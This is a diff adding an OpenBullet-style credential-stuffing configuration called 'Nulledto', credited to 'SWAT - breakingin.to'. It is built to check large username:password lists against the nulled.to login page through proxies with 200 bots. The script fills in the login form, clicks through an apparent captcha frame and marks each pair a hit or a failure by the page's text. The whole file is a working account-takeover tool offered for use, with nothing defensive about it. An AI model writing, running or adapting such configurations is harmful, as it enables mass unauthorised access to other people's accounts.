@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "Nulledto",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-15T06:16:32.7081459-07:00",
+  "AdditionalInfo": "Check Out BreakingIn.To",
+  "RequiredPlugins": [],
+  "Author": "SWAT - breakingin.to",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BROWSERACTION Open 
+
+NAVIGATE "https://www.nulled.to/index.php?app=core&module=global&section=login" 
+
+#delay FUNCTION Delay "5000" 
+
+ELEMENTACTION XPath "//*[@id=\"ips_username\"]" 
+  SendKeys "<USER>" 
+
+ELEMENTACTION XPath "//*[@id=\"ips_password\"]" 
+  SendKeys "<PASS>" 
+
+ELEMENTACTION XPath "//*[@id=\"regular_signin\"]/ul/li[3]/div/div/div/iframe" 
+  Click 
+
+ELEMENTACTION Id "//*[@id=\"login\"]/fieldset[2]/input" 
+  Click 
+
+#delay2 FUNCTION Delay "2000" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Username or password incorrect." 
+  KEYCHAIN Success OR 
+    KEY "Sign Out" 
+
